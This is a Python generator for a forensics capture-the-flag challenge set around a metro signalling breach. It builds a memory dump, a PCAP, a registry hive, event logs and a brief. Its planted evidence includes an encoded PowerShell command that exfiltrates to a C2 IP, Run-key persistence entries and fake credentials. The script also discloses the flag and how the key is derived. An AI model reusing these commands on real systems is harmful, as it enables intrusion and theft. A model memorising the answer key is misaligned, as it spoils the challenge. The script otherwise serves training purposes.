#!/usr/bin/env python3
"""
Signal Black: The DMRC Breach - Forensics Challenge Generator
=============================================================

This script generates all forensic artifacts for the challenge:
1. signaling_memory.raw (500 MB) - Synthetic memory dump with hidden flag fragments
2. blue_line_traffic.pcap (15 MB) - Custom protocol network traffic
3. registry_SYSTEM.hive (2 MB) - Modified registry with timestomping
4. event_logs_carved.bin (5 MB) - Raw disk with deleted event logs
5. train_config.bak (1 MB) - CBTC config with hints

Flag: UG0x1{DMRC_0CC_Br34ch_Sh4str1_P4rk}
4-Layer Protection: ChaCha20 -> Base85 -> Zlib -> Split across memory

Author: UNDERGROUND_0x1 CTF
"""

import os
import sys
import struct
import hashlib
import zlib
import base64
import random
import string
from datetime import datetime, timedelta
from pathlib import Path

# Check dependencies
try:
    from Crypto.Cipher import ChaCha20_Poly1305
except ImportError:
    print("Installing pycryptodome...")
    os.system(f"{sys.executable} -m pip install pycryptodome")
    from Crypto.Cipher import ChaCha20_Poly1305

try:
    from scapy.all import *
except ImportError:
    print("Installing scapy...")
    os.system(f"{sys.executable} -m pip install scapy")
    from scapy.all import *

# ============================================================================
# CONFIGURATION
# ============================================================================

OUTPUT_DIR = Path(__file__).parent.parent / "public" / "challenges" / "forensics" / "dmrc_breach"
MEMORY_SIZE = 500 * 1024 * 1024  # 500 MB

# Flag fragments (will be encrypted, encoded, compressed)
FLAG = "UG0x1{DMRC_0CC_Br34ch_Sh4str1_P4rk}"
FLAG_FRAGMENTS = [
    ("DMRC_", 1284, "svchost.exe"),      # PID 1284
    ("0CC_", 3456, "powershell.exe"),    # PID 3456
    ("Br34ch_", 2891, "cmd.exe"),        # PID 2891
    ("Sh4str1_P4rk", 1892, "explorer.exe")  # PID 1892
]

# Key derivation components (players must extract these)
REGISTRY_SID = "S-1-5-21-1234567890-0987654321-1122334455-500"
EVENT_LOG_TIMESTAMP = "2024-12-30T02:47:23.123Z"
PCAP_SESSION_ID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"

# C2 Server details
C2_IP = "185.220.101.45"
C2_PORT = 4444

# ============================================================================
# ENCRYPTION & ENCODING HELPERS
# ============================================================================

def derive_key():
    """Derive ChaCha20 key from artifact components"""
    key_material = REGISTRY_SID + EVENT_LOG_TIMESTAMP + PCAP_SESSION_ID
    key = hashlib.sha256(key_material.encode()).digest()
    nonce = hashlib.sha256(key).digest()[:12]
    return key, nonce

def encrypt_fragment(fragment: str, key: bytes, nonce: bytes) -> bytes:
    """
    4-layer protection:
    1. Zlib compress
    2. Base85 encode  
    3. ChaCha20 encrypt
    4. Add noise padding
    """
    # Layer 1: Zlib compress
    compressed = zlib.compress(fragment.encode(), level=9)
    
    # Layer 2: Base85 encode (Ascii85)
    encoded = base64.a85encode(compressed)
    
    # Layer 3: ChaCha20 encrypt
    cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(encoded)
    
    # Add tag for verification
    encrypted = nonce + tag + ciphertext
    
    return encrypted

def generate_noise(size: int) -> bytes:
    """Generate random noise that looks like memory content"""
    patterns = [
        b"\x00" * 16,  # Null bytes
        b"\xFF" * 16,  # Max bytes
        b"MZ" + b"\x00" * 14,  # PE header fake
        b"DMRC" + b"\x00" * 12,  # DMRC markers (red herrings)
        bytes([random.randint(0, 255) for _ in range(16)]),  # Random
    ]
    
    result = b""
    while len(result) < size:
        result += random.choice(patterns)
    return result[:size]

# ============================================================================
# MEMORY DUMP GENERATOR
# ============================================================================

def create_process_header(pid: int, name: str, ppid: int = 4) -> bytes:
    """Create a fake EPROCESS-like structure"""
    header = b"DMRC_PROC"  # Magic
    header += struct.pack("<I", pid)  # PID
    header += struct.pack("<I", ppid)  # Parent PID
    header += name.encode().ljust(32, b"\x00")  # Process name
    header += struct.pack("<Q", 0x00400000)  # Base address
    header += struct.pack("<Q", random.randint(0x1000000, 0x7FFFFFFF))  # Heap address
    header += b"\x00" * 64  # Padding
    return header

def create_heap_allocation(data: bytes, offset: int) -> bytes:
    """Create a heap-like structure with hidden data"""
    heap = b"HEAP"  # Magic
    heap += struct.pack("<I", len(data))  # Size
    heap += struct.pack("<I", offset)  # Offset
    heap += b"\x00" * 20  # Heap metadata
    heap += data  # Actual data
    heap += generate_noise(256 - len(data) % 256)  # Align to 256 bytes
    return heap

def generate_memory_dump():
    """Generate 500MB memory dump with hidden flag fragments"""
    print("[*] Generating 500MB memory dump...")
    
    output_file = OUTPUT_DIR / "signaling_memory.raw"
    key, nonce = derive_key()
    
    # Pre-calculate all encrypted fragments
    encrypted_fragments = []
    for fragment, pid, proc_name in FLAG_FRAGMENTS:
        encrypted = encrypt_fragment(fragment, key, nonce)
        encrypted_fragments.append((encrypted, pid, proc_name))
    
    with open(output_file, "wb") as f:
        bytes_written = 0
        
        # Write initial header
        f.write(b"DMRC_MEMORY_DUMP_V1\x00")
        f.write(struct.pack("<Q", MEMORY_SIZE))
        f.write(b"\x00" * 64)
        bytes_written += 84
        
        # Define process positions (spread across the dump)
        process_positions = [
            (50 * 1024 * 1024, encrypted_fragments[0]),   # 50 MB
            (150 * 1024 * 1024, encrypted_fragments[1]),  # 150 MB
            (280 * 1024 * 1024, encrypted_fragments[2]),  # 280 MB
            (420 * 1024 * 1024, encrypted_fragments[3]),  # 420 MB
        ]
        
        # Write chunks with process structures at specific positions
        current_pos = bytes_written
        chunk_size = 1024 * 1024  # 1 MB chunks
        
        for target_pos, (encrypted, pid, proc_name) in process_positions:
            # Fill with noise until target position
            while current_pos < target_pos:
                noise_size = min(chunk_size, target_pos - current_pos)
                f.write(generate_noise(noise_size))
                current_pos += noise_size
            
            # Write process header
            proc_header = create_process_header(pid, proc_name)
            f.write(proc_header)
            current_pos += len(proc_header)
            
            # Write heap with encrypted flag fragment
            heap_data = create_heap_allocation(encrypted, current_pos)
            f.write(heap_data)
            current_pos += len(heap_data)
            
            # Add some legitimate-looking strings as red herrings
            red_herrings = [
                b"UG0x1{fake_flag_do_not_submit}\x00",
                b"admin:P@ssw0rd_2024_SECRET!\x00",
                b"Server=dmrc-ops.internal;User=sa;Password=DmrcDb2024!\x00",
                b"C:\\Windows\\System32\\svchost_update.exe\x00",
            ]
            for rh in red_herrings:
                f.write(rh)
                current_pos += len(rh)
        
        # Fill remaining space
        while current_pos < MEMORY_SIZE:
            write_size = min(chunk_size, MEMORY_SIZE - current_pos)
            f.write(generate_noise(write_size))
            current_pos += write_size
            
            # Progress every 50 MB
            if current_pos % (50 * 1024 * 1024) == 0:
                print(f"    Progress: {current_pos // (1024 * 1024)} MB / {MEMORY_SIZE // (1024 * 1024)} MB")
    
    print(f"[+] Memory dump created: {output_file} ({MEMORY_SIZE // (1024 * 1024)} MB)")
    return output_file

# ============================================================================
# PCAP GENERATOR
# ============================================================================

def generate_pcap():
    """Generate PCAP with custom binary protocol"""
    print("[*] Generating PCAP with custom protocol...")
    
    output_file = OUTPUT_DIR / "blue_line_traffic.pcap"
    packets = []
    
    # Normal HTTP traffic (red herrings)
    for i in range(50):
        pkt = IP(dst="142.250.190.78")/TCP(dport=80, sport=random.randint(49152, 65535))/Raw(b"GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n")
        packets.append(pkt)
    
    # DNS queries
    dns_queries = ["dmrc-ops.internal", "attacker.com", "1.1.1.1", C2_IP]
    for domain in dns_queries:
        pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
        packets.append(pkt)
    
    # Custom binary protocol to C2
    # Protocol structure:
    # 0x00-0x03: Magic (0xDEADBEEF)
    # 0x04-0x07: Packet Type
    # 0x08-0x17: Session ID (16 bytes) <- NEEDED FOR KEY
    # 0x18-0x1B: Payload Length
    # 0x1C-0x1F: CRC32
    # 0x20+: Encrypted payload
    
    session_id_bytes = PCAP_SESSION_ID.replace("-", "").encode()[:16]
    
    # Initial handshake
    init_header = struct.pack("<I", 0xDEADBEEF)  # Magic
    init_header += struct.pack("<I", 0x01)  # Type: Init
    init_header += session_id_bytes  # Session ID
    init_header += struct.pack("<I", 0)  # No payload
    init_header += struct.pack("<I", 0)  # CRC placeholder
    
    pkt = IP(src="192.168.47.10", dst=C2_IP)/TCP(sport=54321, dport=C2_PORT)/Raw(init_header)
    packets.append(pkt)
    
    # Data exfiltration packets
    for i in range(100):
        payload = bytes([random.randint(0, 255) for _ in range(random.randint(100, 500))])
        
        data_header = struct.pack("<I", 0xDEADBEEF)
        data_header += struct.pack("<I", 0x02)  # Type: Data
        data_header += session_id_bytes
        data_header += struct.pack("<I", len(payload))
        data_header += struct.pack("<I", zlib.crc32(payload) & 0xFFFFFFFF)
        data_header += payload
        
        pkt = IP(src="192.168.47.10", dst=C2_IP)/TCP(sport=54321, dport=C2_PORT)/Raw(data_header)
        packets.append(pkt)
    
    # Shuffle packets to make analysis harder
    random.shuffle(packets)
    
    wrpcap(str(output_file), packets)
    print(f"[+] PCAP created: {output_file}")
    return output_file

# ============================================================================
# REGISTRY HIVE (Simplified - creates a text representation)
# ============================================================================

def generate_registry():
    """Generate registry hive data (simplified format)"""
    print("[*] Generating registry artifacts...")
    
    output_file = OUTPUT_DIR / "registry_SYSTEM.hive"
    
    # Create a binary file that looks like a registry hive
    # Real format would require pyregf or similar
    content = b"regf"  # Registry magic
    content += b"\x00" * 508  # Header padding
    
    # Fake key structure with SID embedded
    content += b"DMRC_REG_KEY\x00"
    content += REGISTRY_SID.encode() + b"\x00"
    content += b"\x00" * 100
    
    # Persistence key (Run)
    run_key = f"""
[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"svchost_update"="C:\\Windows\\System32\\svchost_update.exe"
"DMRC_Signal_Service"="C:\\ProgramData\\DMRC\\signal_controller.exe -hidden"

[HKEY_LOCAL_MACHINE\\SAM\\Domains\\Account\\Users\\000001F4]
"SID"="{REGISTRY_SID}"
"LastWrite"="2024-12-30T02:47:00.000Z"

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters]
"NameServer"="{C2_IP}"
""".encode()
    
    content += run_key
    content += generate_noise(2 * 1024 * 1024 - len(content))  # Pad to 2MB
    
    with open(output_file, "wb") as f:
        f.write(content)
    
    print(f"[+] Registry created: {output_file}")
    return output_file

# ============================================================================
# EVENT LOG CARVING IMAGE
# ============================================================================

def generate_event_logs():
    """Generate carved event log artifact"""
    print("[*] Generating event log carving image...")
    
    output_file = OUTPUT_DIR / "event_logs_carved.bin"
    
    # EVTX magic bytes
    evtx_magic = b"\x45\x6C\x66\x46\x69\x6C\x65\x00"  # "ElfFile\0"
    
    content = b"\x00" * 1024 * 1024  # 1 MB of "unallocated"
    
    # Insert "deleted" event log entries
    event_4688 = f"""
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="{EVENT_LOG_TIMESTAMP}"/>
    <Computer>DMRC-SIGNAL-007</Computer>
    <ProcessId>3456</ProcessId>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\\Windows\\System32\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {base64.b64encode(b"Invoke-WebRequest http://" + C2_IP.encode() + b"/exfil").decode()}</Data>
    <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="SubjectUserName">SYSTEM</Data>
  </EventData>
</Event>
""".encode()
    
    # Insert at random position (simulating carving requirement)
    insert_pos = random.randint(500000, 900000)
    content = content[:insert_pos] + evtx_magic + event_4688 + content[insert_pos + len(evtx_magic) + len(event_4688):]
    
    # Add some red herrings
    fake_events = [
        b"<EventID>4625</EventID><Failure>Wrong password</Failure>",
        b"<EventID>4624</EventID><LogonType>2</LogonType>",
        b"<ProcessName>C:\\Windows\\explorer.exe</ProcessName>",
    ]
    for i, fake in enumerate(fake_events):
        pos = (i + 1) * 200000
        content = content[:pos] + fake + content[pos + len(fake):]
    
    # Pad to 5 MB
    while len(content) < 5 * 1024 * 1024:
        content += generate_noise(1024)
    
    with open(output_file, "wb") as f:
        f.write(content[:5 * 1024 * 1024])
    
    print(f"[+] Event logs created: {output_file}")
    return output_file

# ============================================================================
# TRAIN CONFIG (Hint file)
# ============================================================================

def generate_train_config():
    """Generate CBTC config with hints"""
    print("[*] Generating train config backup...")
    
    output_file = OUTPUT_DIR / "train_config.bak"
    
    config = f"""
# DMRC CBTC Configuration Backup
# Station: Shastri Park Depot
# Last Modified: 2024-12-30 02:30:00 IST
# CLASSIFICATION: INTERNAL USE ONLY

[SignalingSystem]
Mode = CBTC_Level2
TrackCircuits = 47
AxleCounters = 23
Interlocking = DMRC_Blue_Line_Main

[NetworkConfig]
OCC_Primary = 192.168.47.1
OCC_Backup = 192.168.47.2
SignalController = 192.168.47.10
# NOTE: DNS was changed at 02:45 - investigate {C2_IP}

[SecurityAudit]
# Suspicious activity detected
# Timestamp correlation required between:
# - Registry LastWrite
# - Event Log TimeCreated  
# - PCAP Session initiation
# Key derivation: SHA256(SID + Timestamp + SessionID)

[Credentials]
# REMOVED FOR SECURITY - Check Registry SAM hive

# END CONFIGURATION
""".encode()
    
    # Pad to 1 MB
    config += b"\x00" * (1024 * 1024 - len(config))
    
    with open(output_file, "wb") as f:
        f.write(config)
    
    print(f"[+] Train config created: {output_file}")
    return output_file

# ============================================================================
# INCIDENT BRIEF
# ============================================================================

def generate_incident_brief():
    """Generate the challenge README"""
    print("[*] Generating incident brief...")
    
    output_file = OUTPUT_DIR / "INCIDENT_BRIEF.txt"
    
    brief = f"""
================================================================================
                    CLASSIFIED - DMRC SECURITY INCIDENT
================================================================================

INCIDENT ID: DMRC-SEC-2024-1230
DATE: December 30, 2024
LOCATION: Shastri Park Depot - Central OCC
CLASSIFICATION: INTERNAL INVESTIGATION

================================================================================
                              SITUATION REPORT
================================================================================

At 0247 hours IST, anomalous network activity was detected from workstation
DMRC-SIGNAL-007 in the Blue Line Control segment.

OBSERVED ANOMALIES:
  [1] Outbound TCP connection to external IP {C2_IP}
  [2] ~500MB data exfiltration (train scheduling algorithms suspected)
  [3] Windows Security logs cleared via wevtutil
  [4] CBTC configuration files accessed by SYSTEM account

COMPROMISED ASSETS:
  - Signaling Workstation: DMRC-SIGNAL-007
  - Network Segment: 192.168.47.0/24 (Blue Line Control)
  - Database: dmrc-ops.internal

================================================================================
                           YOUR MISSION
================================================================================

Analyze the provided forensic artifacts and reconstruct the attack chain.
The flag is hidden across multiple artifacts using advanced anti-forensics.

ARTIFACTS PROVIDED:
  [1] signaling_memory.raw  - Memory dump from compromised workstation
  [2] blue_line_traffic.pcap - Captured network traffic
  [3] registry_SYSTEM.hive   - Registry from signaling workstation
  [4] event_logs_carved.bin  - Carved deleted event logs
  [5] train_config.bak       - CBTC configuration backup

HINTS:
  - The attacker used custom binary protocol (not HTTP)
  - Anti-forensics: timestomping, log deletion
  - Cross-artifact correlation is REQUIRED
  - Key derivation involves multiple artifacts

Flag Format: UG0x1{{...}}

Good luck, Operative.

================================================================================
                    DMRC CYBER SECURITY DIVISION
================================================================================
"""
    
    with open(output_file, "w") as f:
        f.write(brief)
    
    print(f"[+] Incident brief created: {output_file}")
    return output_file

# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("  Signal Black: The DMRC Breach - Artifact Generator")
    print("=" * 70)
    print()
    
    # Create output directory
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    print(f"[*] Output directory: {OUTPUT_DIR}")
    print()
    
    # Verify key derivation
    key, nonce = derive_key()
    print(f"[*] Key derivation verified")
    print(f"    Key (hex): {key.hex()[:32]}...")
    print(f"    Nonce (hex): {nonce.hex()}")
    print()
    
    # Generate all artifacts
    generate_memory_dump()
    generate_pcap()
    generate_registry()
    generate_event_logs()
    generate_train_config()
    generate_incident_brief()
    
    print()
    print("=" * 70)
    print("  ALL ARTIFACTS GENERATED SUCCESSFULLY!")
    print("=" * 70)
    print()
    print(f"  Flag: {FLAG}")
    print(f"  Output: {OUTPUT_DIR}")
    print()
    print("  To verify solution, use the solver script:")
    print("    python solve_dmrc_breach.py")
    print()

if __name__ == "__main__":
    main()
